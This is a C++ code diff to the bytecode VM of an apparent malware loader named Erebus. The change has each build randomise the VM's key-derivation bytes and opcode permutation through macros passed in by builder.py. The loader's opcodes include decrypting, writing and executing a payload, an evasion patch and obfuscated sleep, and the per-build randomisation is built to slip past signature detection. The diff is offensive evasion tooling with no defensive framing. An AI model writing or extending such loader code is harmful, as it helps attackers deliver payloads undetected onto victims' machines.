@@ -99,10 +99,29 @@ struct VMLoaderContext {
 // Both sides derive the same 32-byte key from the same seed.
 // -----------------------------------------------------------------------
 
+// [MALLEABLE] Per-build 6-byte key derivation base. builder.py passes
+// -DVM_KEY_BASE_0..5 with random bytes; defaults here are fallback only.
+#ifndef VM_KEY_BASE_0
+#define VM_KEY_BASE_0 'e'
+#define VM_KEY_BASE_1 'r'
+#define VM_KEY_BASE_2 'e'
+#define VM_KEY_BASE_3 'b'
+#define VM_KEY_BASE_4 'u'
+#define VM_KEY_BASE_5 's'
+#endif
+
 static inline std::array<std::uint8_t, 32>
 vm_derive_key(std::uint32_t seed) noexcept {
     std::array<std::uint8_t, 32> key{};
-    constexpr std::uint8_t base[6] = {'e', 'r', 'e', 'b', 'u', 's'};
+    // [MALLEABLE] base bytes replaced per-build — must match vmloader_builder.cpp.
+    constexpr std::uint8_t base[6] = {
+        (std::uint8_t)VM_KEY_BASE_0,
+        (std::uint8_t)VM_KEY_BASE_1,
+        (std::uint8_t)VM_KEY_BASE_2,
+        (std::uint8_t)VM_KEY_BASE_3,
+        (std::uint8_t)VM_KEY_BASE_4,
+        (std::uint8_t)VM_KEY_BASE_5,
+    };
     for (std::size_t i = 0; i < key.size(); ++i)
         key[i] = static_cast<std::uint8_t>(
             base[i % 6] + (seed & 0xFF) + i * 17u);
@@ -313,15 +332,25 @@ using ErebusVMOpcodeList = vmkit::OpcodeList<
 // -----------------------------------------------------------------------
 // Loader VM configuration
 // -----------------------------------------------------------------------
-// Default opcode reverse map (encoded byte → real ErebusVMOp).
-// The builder uses the inverse forward map when writing IR bytecode.
-// Override at build time by redefining the constexpr array below and
-// passing matching -D flags when compiling vmloader_builder.cpp.
+// Opcode reverse map (encoded byte → real ErebusVMOp) is derived at
+// compile time from VM_FWD_0..7 — the same macros vmloader_builder.cpp
+// uses for its forward map. builder.py passes a fresh random permutation
+// of [0..7] as -DVM_FWD_0=N..-DVM_FWD_7=N to both compile units, so
+// the loader's decode table always matches the builder's encode table.
 //
-// Default permutation (fixed; randomise per-build via builder.py):
-//   Real → Encoded:  0→7  1→5  2→3  3→1  4→6  5→0  6→2  7→4
-//   Encoded → Real:  0→5  1→3  2→6  3→2  4→7  5→1  6→4  7→0
+// [MALLEABLE] VM_FWD_* come from builder.py; defaults are fallback only.
 // -----------------------------------------------------------------------
+
+#ifndef VM_FWD_0
+#define VM_FWD_0 7
+#define VM_FWD_1 5
+#define VM_FWD_2 3
+#define VM_FWD_3 1
+#define VM_FWD_4 6
+#define VM_FWD_5 0
+#define VM_FWD_6 2
+#define VM_FWD_7 4
+#endif
 
 struct LoaderVMConfig : vmkit::DefaultConfig {
     static constexpr bool opcode_randomization      = true;
@@ -330,15 +359,15 @@ struct LoaderVMConfig : vmkit::DefaultConfig {
 
     static constexpr vmkit::OpcodeReverseMap opcode_reverse_map = [] {
         vmkit::OpcodeReverseMap m = vmkit::identity_reverse_map();
-        // encoded byte → real ErebusVMOp (inverse of forward map in builder)
-        m[0] = static_cast<std::uint8_t>(ErebusVMOp::ProtectRX);
-        m[1] = static_cast<std::uint8_t>(ErebusVMOp::WritePayload);
-        m[2] = static_cast<std::uint8_t>(ErebusVMOp::ExecPayload);
-        m[3] = static_cast<std::uint8_t>(ErebusVMOp::AllocRegion);
-        m[4] = static_cast<std::uint8_t>(ErebusVMOp::FreeRegion);
-        m[5] = static_cast<std::uint8_t>(ErebusVMOp::ObfuscatedSleep);
-        m[6] = static_cast<std::uint8_t>(ErebusVMOp::DecryptPayload);
-        m[7] = static_cast<std::uint8_t>(ErebusVMOp::EvasionPatch);
+        // Derive reverse map (encoded→real) by inverting the forward map
+        // (real→encoded) supplied via VM_FWD_* macros. Both the builder
+        // and loader receive the same macros, so they are always in sync.
+        constexpr std::uint8_t fwd[8] = {
+            VM_FWD_0, VM_FWD_1, VM_FWD_2, VM_FWD_3,
+            VM_FWD_4, VM_FWD_5, VM_FWD_6, VM_FWD_7
+        };
+        for (int i = 0; i < 8; ++i)
+            m[fwd[i]] = static_cast<std::uint8_t>(i);
         return m;
     }();
 
